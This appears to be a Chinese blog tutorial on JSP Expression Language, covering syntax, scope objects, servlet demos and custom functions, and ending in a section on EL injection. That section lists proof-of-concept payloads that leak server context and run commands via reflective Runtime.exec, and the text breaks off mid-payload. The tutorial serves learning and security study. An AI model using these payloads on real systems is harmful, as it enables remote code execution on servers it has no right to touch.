+<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">$&#123;EL表达式&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>EL表达式和JSP代码等价转换</p>
+<h3 id="与-运算符"><a href="#与-运算符" class="headerlink" title="[ ]与.运算符"></a>[ ]与.运算符</h3><p>EL表达式提供<code>.</code>和<code>[]</code>两种运算符来存取数据</p>
+<p>当要存取的属性名称中包含一些特殊字符，如<code>.</code>或<code>-</code>等并非字母或数字的符号，就一定要使用<code>[]</code></p>
+<p>eg：<code>$&#123;user.My-Name&#125;</code>应当改为<code>$&#123;user[&quot;My-Name&quot;]&#125;</code></p>
+<p>如果要<strong>动态取值</strong>时，就可以用<code>[]</code>来做，而<code>.</code>无法做到动态取值</p>
+<p>eg：<code>$&#123;sessionScope.user[data]&#125;</code>中 data 是一个变量</p>
+<hr>
+<h3 id="empty"><a href="#empty" class="headerlink" title="empty"></a>empty</h3><p><code>empty</code> 用来判断 EL 表达式中的对象或者变量是否为空。若为空或者 null，返回 true，否则返回 false</p>
+<hr>
+<h3 id="条件表达式"><a href="#条件表达式" class="headerlink" title="条件表达式"></a>条件表达式</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span>条件表达式<span class="token operator">?</span>表达式<span class="token number">1</span><span class="token operator">:</span>表达式<span class="token number">2</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<hr>
+<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>以<code>$&#123;username&#125;</code>为例，意思是取出某一范围中名称为 username 的变量。</p>
+<p>因为我们并没有指定哪一个范围的username，所以它会依序从 Page、Request、Session、Application 范围查找。假如途中找到username，就直接回传，不再继续找下去，但是假如全部的范围都没有找到时，就回传<code>&quot;&quot;</code>。（注意是空字符串）</p>
+<p>EL表达式属性：可以对应jsp中的对象</p>
+<table>
+<thead>
+<tr>
+<th>属性范围在EL中的名称</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Page</td>
+<td>PageScope</td>
+</tr>
+<tr>
+<td>Request</td>
+<td>RequestScope</td>
+</tr>
+<tr>
+<td>Session</td>
+<td>SessionScope</td>
+</tr>
+<tr>
+<td>Application</td>
+<td>ApplicationScope</td>
+</tr>
+</tbody></table>
+<p>这四个域对象的作用范围如下图：</p>
+<p><img src="/blog/2024/02/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240716124225515.png" alt="image-20240716124225515"></p>
+<h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p>现在定义一个Servlet</p>
+<blockquote>
+<p>转发的作用：通过转发，我们才可以使用 request 对象作为域对象进行数据共享</p>
+</blockquote>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>learnservlet</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>learnservlet<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">Band</span></span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>
+
+<span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span><span class="token string">"/ElDemo1"</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ElDemo</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">//1. 准备数据</span>
+        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Band</span><span class="token punctuation">></span></span> bands <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Band</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        bands<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Band</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"结束乐队"</span><span class="token punctuation">,</span><span class="token string">"孤独摇滚"</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">"Guitar Hero"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        bands<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Band</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"MyGO!!!!!"</span><span class="token punctuation">,</span><span class="token string">"BanGDream It's MyGO!!!!!"</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"为什么要演奏春日影！"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        bands<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Band</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"有刺无刺"</span><span class="token punctuation">,</span><span class="token string">"Girls Band Cry"</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token string">"凸😄凸"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">//2. 存储到request域中</span>
+        request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"bands"</span><span class="token punctuation">,</span>bands<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">//3. 转发到 el-demo.jsp</span>
+        request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"/el-demo.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doGet</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>el-demo.jsp，这里通过EL表达式获取数据</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; isELIgnored&#x3D;&quot;false&quot; %&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
+    &lt;title&gt;EL Demo&lt;&#x2F;title&gt;
+&lt;&#x2F;head&gt;
+&lt;body&gt;
+&lt;table&gt;
+    &lt;tr&gt;$&#123;bands&#125;&lt;&#x2F;tr&gt;
+&lt;&#x2F;table&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后访问&#x2F;ElDemo1接口，是可以访问到数据的</p>
+<p><img src="/blog/2024/02/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240716191006924.png" alt="image-20240716191006924"></p>
+<hr>
+<h3 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h3><p>JSP 表达式语言提供以下操作符，其中大部分是 Java 中常用的操作符：</p>
+<table>
+<thead>
+<tr>
+<th>术语</th>
+<th>定义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>算术型</td>
+<td>+、-（二元）、*、&#x2F;、div、%、mod、-（一元）</td>
+</tr>
+<tr>
+<td>逻辑型</td>
+<td>and、&amp;&amp;、or、双管道符、!、not</td>
+</tr>
+<tr>
+<td>关系型</td>
+<td>&#x3D;&#x3D;、eq、!&#x3D;、ne、&lt;、lt、&gt;、gt、&lt;&#x3D;、le、&gt;&#x3D;、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。</td>
+</tr>
+<tr>
+<td>空</td>
+<td>empty 空操作符是前缀操作，可用于确定值是否为空。</td>
+</tr>
+<tr>
+<td>条件型</td>
+<td>A ?B :C。根据 A 赋值的结果来赋值 B 或 C。</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="隐式对象"><a href="#隐式对象" class="headerlink" title="隐式对象"></a>隐式对象</h2><p>JSP 表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用：</p>
+<table>
+<thead>
+<tr>
+<th>术语</th>
+<th>定义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pageContext</td>
+<td>JSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，<code>$&#123;pageContext.response&#125;</code>为页面的响应对象赋值。</td>
+</tr>
+</tbody></table>
+<p>此外，还提供几个隐式对象，允许对以下对象进行简易访问：</p>
+<table>
+<thead>
+<tr>
+<th>术语</th>
+<th>定义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>param</td>
+<td>将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式<code>$&#123;param.name&#125;</code>相当于 <code>request.getParameter (name)</code>。</td>
+</tr>
+<tr>
+<td>paramValues</td>
+<td>将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 <code>$&#123;paramvalues. name&#125;</code> 相当于 <code>request.getParamterValues(name)</code>。</td>
+</tr>
+<tr>
+<td>header</td>
+<td>将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 <code>$&#123;header.name&#125;</code> 相当于 <code>request.getHeader(name)</code>。</td>
+</tr>
+<tr>
+<td>headerValues</td>
+<td>将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式<code>$&#123;headerValues.name&#125;</code>相当于 <code>request.getHeaderValues(name)</code>。</td>
+</tr>
+<tr>
+<td>cookie</td>
+<td>将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式<code>$&#123;cookie.name.value&#125;</code>返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用<code>$&#123;headerValues.name&#125;</code>表达式。</td>
+</tr>
+<tr>
+<td>initParam</td>
+<td>将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。</td>
+</tr>
+</tbody></table>
+<p>除了上述两种类型的隐式对象之外，还有些对象允许访问多种范围的变量，如 Web 上下文、会话、请求、页面：</p>
+<table>
+<thead>
+<tr>
+<th>术语</th>
+<th>定义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pageScope</td>
+<td>将页面范围的变量名称映射到其值。例如，EL 表达式可以使用<code>$&#123;pageScope.objectName&#125;</code>访问一个 JSP 中页面范围的对象，还可以使用<code>$&#123;pageScope .objectName. attributeName&#125;</code>访问对象的属性。</td>
+</tr>
+<tr>
+<td>requestScope</td>
+<td>将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用<code>$&#123;requestScope. objectName&#125;</code>访问一个 JSP 请求范围的对象，还可以使用<code>$&#123;requestScope. objectName. attributeName&#125;</code>访问对象的属性。</td>
+</tr>
+<tr>
+<td>sessionScope</td>
+<td>将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：<code>$&#123;sessionScope. name&#125;</code></td>
+</tr>
+<tr>
+<td>applicationScope</td>
+<td>将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。</td>
+</tr>
+</tbody></table>
+<p>用一个demo来看一下：</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page import&#x3D;&quot;java.io.*,java.util.*&quot; %&gt;
+&lt;%
+    String title &#x3D; &quot;Accessing Request Param&quot;;
+%&gt;
+&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;&lt;% out.print(title); %&gt;&lt;&#x2F;title&gt;
+&lt;&#x2F;head&gt;
+&lt;body&gt;
+&lt;h3&gt;通过访问 pageContext 对象来访问 request 对象，例如访问request对象传入的查询字符串&lt;&#x2F;h3&gt;
+$&#123;pageContext.request.queryString&#125;
+&lt;br&gt;
+
+
+&lt;h3&gt;Scope 对象&lt;&#x2F;h3&gt;
+&lt;!--pageContext没有对应方法的请导入tomcat lib目录下的jsp-api.jar--&gt;
+&lt;%
+    pageContext.setAttribute(&quot;name&quot;,&quot;nina&quot;);
+    request.setAttribute(&quot;name&quot;,&quot;momoka&quot;);
+    session.setAttribute(&quot;user&quot;,&quot;tomo&quot;);
+    application.setAttribute(&quot;user&quot;,&quot;rupa&quot;);
+%&gt;
+
+pageScope.name:$&#123;pageScope.name&#125;
+&lt;br&gt;
+requestScope.name : $&#123;requestScope.name&#125;
+&lt;br&gt;
+sessionScope.user : $&#123;sessionScope.user&#125;
+&lt;br&gt;
+applicationScope.user : $&#123;applicationScope.user&#125;
+&lt;br&gt;
+
+
+&lt;h3&gt;param 和 paramValues 对象&lt;&#x2F;h3&gt;
+&lt;p&gt;$&#123;param[&quot;username&quot;]&#125;&lt;&#x2F;p&gt;
+&lt;br&gt;
+
+
+&lt;h3&gt;header 和 headerValues 对象&lt;&#x2F;h3&gt;
+&lt;p&gt;$&#123;header[&quot;user-agent&quot;]&#125;&lt;&#x2F;p&gt;
+
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2024/02/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719114356983.png" alt="image-20240719114356983"></p>
+<hr>
+<h2 id="EL中的函数"><a href="#EL中的函数" class="headerlink" title="EL中的函数"></a>EL中的函数</h2><p>EL允许您在表达式中使用函数。这些函数必须被定义在自定义标签库中。函数的使用语法如下：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span>ns<span class="token operator">:</span><span class="token function">func</span><span class="token punctuation">(</span>param1<span class="token punctuation">,</span> param2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>ns 指的是命名空间（namespace），func 指的是函数的名称，param1 指的是第一个参数，param2 指的是第二个参数，以此类推。比如，有函数 <code>fn:length</code>，在 JSTL 库中定义，可以像下面这样来获取一个字符串的长度：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span>fn<span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token string">"Get my length"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>要使用任何标签库中的函数，您需要将这些库安装在服务器中，然后使用 <code>&lt;taglib&gt;</code> 标签在 JSP 文件中包含这些库。</p>
+<hr>
+<h2 id="调用Java方法"><a href="#调用Java方法" class="headerlink" title="调用Java方法"></a>调用Java方法</h2><p>直接看demo</p>
+<p>先新建一个 ELFunc 类，其中定义的 <code>doSomething()</code> 方法用于给输入的参数字符拼接 <code>&quot;.com&quot;</code> 形成域名返回：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>learnservlet</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ELFunc</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> str <span class="token operator">+</span> <span class="token string">".com"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接着在 WEB-INF 文件夹下（除 lib 和 classess 目录外）新建 test.tld 文件，其中指定执行的 Java 方法及其 URI 地址：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>taglib</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.0<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/j2ee<span class="token punctuation">"</span></span>
+        <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
+        <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tlib-version</span><span class="token punctuation">></span></span>1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tlib-version</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>short-name</span><span class="token punctuation">></span></span>ELFunc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>short-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uri</span><span class="token punctuation">></span></span>http://localhost/ELFunc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>uri</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>function</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>doSomething<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>function-class</span><span class="token punctuation">></span></span>com.example.learnservlet.ELFunc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>function-class</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>function-signature</span><span class="token punctuation">></span></span> java.lang.String doSomething(java.lang.String)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>function-signature</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>function</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>taglib</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>JSP 文件中，先头部导入 <code>taglib</code> 标签库，URI 为 <code>test.tld</code> 中设置的 URI 地址，prefix 为 <code>test.tld</code> 中设置的 short-name，然后直接在 EL 表达式中使用 <code>类名:方法名()</code> 的形式来调用该类方法即可：</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@taglib uri&#x3D;&quot;http:&#x2F;&#x2F;localhost&#x2F;ELFunc&quot; prefix&#x3D;&quot;ELFunc&quot;%&gt;
+&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Title&lt;&#x2F;title&gt;
+&lt;&#x2F;head&gt;
+&lt;body&gt;
+$&#123;ELFunc:doSomething(&quot;0w0&quot;)&#125;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2024/02/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719111704379.png" alt="image-20240719111704379"></p>
+<hr>
+<h1 id="启动-x2F-禁用EL表达式"><a href="#启动-x2F-禁用EL表达式" class="headerlink" title="启动&#x2F;禁用EL表达式"></a>启动&#x2F;禁用EL表达式</h1><h2 id="全局禁用EL表达式"><a href="#全局禁用EL表达式" class="headerlink" title="全局禁用EL表达式"></a>全局禁用EL表达式</h2><p>web.xml 中进入如下配置：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jsp-config</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jsp-property-group</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>*.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-ignored</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-ignored</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jsp-property-group</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jsp-config</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="单个文件禁用EL表达式"><a href="#单个文件禁用EL表达式" class="headerlink" title="单个文件禁用EL表达式"></a>单个文件禁用EL表达式</h2><p>在JSP文件中可以有如下定义：</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page isELIgnored&#x3D;&quot;true&quot; %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>该语句表示是否禁用EL表达式，TRUE 表示禁止，FALSE 表示不禁止</p>
+<p>JSP2.0 中默认的启用EL表达式</p>
+<hr>
+<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><p>表达式外部可控导致攻击者注入恶意表达式实现任意代码执行</p>
+<h2 id="通用poc"><a href="#通用poc" class="headerlink" title="通用poc"></a>通用poc</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span>
+$<span class="token punctuation">&#123;</span>pageContext<span class="token punctuation">&#125;</span>
+
+<span class="token comment">//获取Web路径</span>
+$<span class="token punctuation">&#123;</span>pageContext<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
+
+<span class="token comment">//文件头参数</span>
+$<span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span>
+
+<span class="token comment">//获取webRoot</span>
+$<span class="token punctuation">&#123;</span>applicationScope<span class="token punctuation">&#125;</span>
+
+<span class="token comment">//执行命令</span>
+$<span class="token punctuation">&#123;</span>pageContext<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>pageContext<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
+
+$<span class="token punctuation">&#123;</span>''<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token char">'exec'</span><span class="token punctuation">,</span>''<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>''<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span 